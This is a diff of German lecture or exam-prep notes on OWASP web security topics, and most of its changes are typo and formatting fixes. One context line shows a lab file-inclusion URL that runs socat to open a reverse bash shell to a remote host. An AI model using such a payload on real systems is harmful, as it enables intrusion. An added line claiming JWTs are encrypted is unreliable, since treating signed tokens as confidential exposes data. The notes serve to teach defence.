@@ -866,11 +866,11 @@ Beispiel: Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokolli
   - Datenbanken
   - Browser
 - **Angriffsszenarien**
-  - Kreditkartennummer werden in einer Datenbank verschlüsselt gespeichert
+  - Kreditkartennummer werden in einer Datenbank unverschlüsselt gespeichert
   - Angreifer können die Kreditkartennummern dann durch eine SQL-Injektion direkt im Klartext aus der Datenbank abfragen
   - Eine Web-Anwendung erzwingt die Verwendung von TLS **nicht** 
 - **Maßnahmen**
-  - Schutzbedarf der zu speichernden ermitteln
+  - Schutzbedarf der zu speichernden Daten ermitteln
   - Klassifizieren nach Sensibilität
   - Sensible Daten nicht unnötig speichern
   - Netzwerkverkehr auf unsichere Protokolle prüfen
@@ -882,7 +882,7 @@ Beispiel: Wenn über CDNs eingebunden wird jeder Aufruf beim Anbieter protokolli
 
 - Eine Anwendung ist verwundbar gegen eine Injektionsangriff, wenn sie
   - Daten, die von Benutzern geliefert werden, **nicht validiert**, filtert oder bereinigt
-  - Direkt interpretierte statements ohne "escaped" zu werden
+  - Direkt interpretierte statements verwendet, ohne dass diese "escaped" (= "kontextsensitiv unschädlich gemacht") werden 
   - Feindselige Daten in den Suchparametern von ORM verwendet
   - Feindselige Daten diret verwendet oder verkettet
 - **Bedrohung**
@@ -1090,7 +1090,7 @@ Escape String but not having quotes around parameter
 - PHP Data Objects
 - Bei dynamischen Abfragen Strings escapen
 - LIMIT verwenden, damit nicht Massenhaft Datensätze entnommen werden können
-- Web Application Firewalls e.g. heruasfiltern gefählicher Zeichen wie e.g. \ " ' oder ;
+- Web Application Firewalls e.g. herausfiltern gefählicher Zeichen wie e.g. \ " ' oder ;
 - Durchgängige Server-seitige Eingabevalidierung
 - Nur tatsächlich erforderliche Rechte für Datenbankbenutzer
 
@@ -1509,7 +1509,7 @@ Anwendung enthält **bekannte Schwachstellen**, für die es vielleicht sogar sch
 - **Beispiele** 
 	- Anwendung erlaubt brute-force Angriffe 
 	- Anwendung verwendet **Standardpasswörter** oder schwache Passwörter 
-	- **Schwache Methode zum wiederherstellen des Zugangs** nach Passwortverlust 
+	- **Schwache Methode zum Wiederherstellen des Zugangs** nach Passwortverlust 
 	- **Speichern** von Passwörtern **im Klartext** oder mit schwacher Hash-Funktion 
 	- **Keine Mehrfaktorauthentifizierung**
 	- Fehlerhafte Sitzungsverwaltung (Session-ID in URL, Reuse von Session-IDs)
@@ -1528,7 +1528,8 @@ Anwendung enthält **bekannte Schwachstellen**, für die es vielleicht sogar sch
 
 - **Bedrohung**
 	- Angreifer **übernimmt** die **Sitzung** eines authentifizierten Nutzers
-Ursachen 
+
+- **Ursachen** 
 	- Zu einfache oder nicht verschlüsselte Passwörter 
 	- Angreifer erhält Zugriff auf die Session ID - Keine Mehrfaktorauthentifizierung
 
@@ -1545,7 +1546,7 @@ Ursachen
 	- Schwache Passwörter
 - **Schutz der Session ID** 
 	- Session-ID nur per SSL übertragen 
-	- Zugriff auf Session-ID durch Clientseitige Skripte unterbinden 
+	- Zugriff auf Session-ID durch clientseitige Skripte unterbinden 
 	- Timeout für automatischen Logout setzen 
 	- Cookie als "Tracking Mode" für die `JSESSIONID` konfigurieren 
 	- Alle `<http-method>`-Tags entfernen
@@ -1569,7 +1570,7 @@ Ursachen
 </session-config>
 ```
 - **Gegenmaßnahmen** 
-	- Brute Force durch ausprobieren von Passwörtern durch CAPTCHAs verhindern 
+	- Brute Force durch Ausprobieren von Passwörtern durch CAPTCHAs verhindern 
 	- Schlechte Logout-Funktionalität absichern, indem Session-Informationen vollständig gelöscht werden 
 	- Keine Passwörter im Klartext speichern, sondern auf Hash-Funktionen mit Salt verlassen 
 	- Bei jedem Zugriff auf eine Seite im Intranet muss geprüft werden, ob eine Authentisierung stattgefunden hat
@@ -1586,19 +1587,19 @@ Treffen von **Annahmen** e.g. über Software-Updates, kritische Daten oder CI/CD
 	- Update ohne Signatur 
 	- Router oder andere Geräte prüfen oft nicht auf Signaturen und sind leichte Angriffsziele 
 	- Solarwinds: Updates mit Schadcode 
-	- Sichere Buildprozesse umgangen und Schadcode eingeschläust
+	- Sichere Buildprozesse umgangen und Schadcode eingeschleust
 
 #### Gegenmaßnahmen
 - Verwenden digitaler **Signaturen**
 - Sicherstellen, dass Dependencies aus **vertauenswürdigen Repositories** stammen
 - Sicherstellen, dass Werkzeuge zur Überprüfung der Supply-Chain eingesetzt werden e.g. **OWASP Dependency Check**
-- **Review Process** fÜr Code- und Konfigurationsänderungen
+- **Review Process** für Code- und Konfigurationsänderungen
 - **Saubere** Trennung, Konfiguration und Zugangssteuerung in der **CI/CD Pipeline**
 - **Serialisierte Daten** nur **signiert** oder **verschlüsselt** übertragen
 
 #### Unsichere Deserialisierung
 
-Anwendunge enthäkt serialisierte Objekte/Datenstrukturen e.g. als XML-, JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf
+Anwendunge enthält serialisierte Objekte/Datenstrukturen e.g. als XML-, JSON- oder Binär-Dokumente und baut daraus durch Desieralisierung entsprechen Objekte/Datenstrukturen wieder neu im eigenen Kontext auf
 
 - Die **serialisierten Daten** können **manipuliert** sein, um gezielt Werte zu verändern oder Code auf dem Zielsystem auszuführen
 - **Anfällig** sind e.g. 
@@ -1748,9 +1749,8 @@ localhost/vulnerabilities/fi/?cmd=socat%20TCP4:172.17.0.1:4444%20EXEC:/bin/bash&
 ```
 
 - **Gegenmaßnahmen**
-
-- **Eingabevalidierung**
-- Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen Switch-case mit den möglichen Files
+  - **Eingabevalidierung**
+  - Indirekter Zugriff mit Lookup-Tabelle, e.g. einfach einen Switch-case mit den möglichen Files
 
 ## Aufgabe 5: Sichere Programmierung (secure coding) (10 Punkte)
 
@@ -2200,4 +2200,5 @@ Erzeugen von Refresh Token (Schritte 1, 2)
 	- Abhilfe durch JSON Web Tokens (JWT) als Refresh Token
 	- Zustand ist dann in JWT enthalten
 	- JWT Refresh Token muss nicht auf Server gespeichert werden
+  - JWT sind verschlüsselt und mit Schlüssel signiert
 	- Server prüft JWT Refresh Token mit seinem geheimen Schlüssel
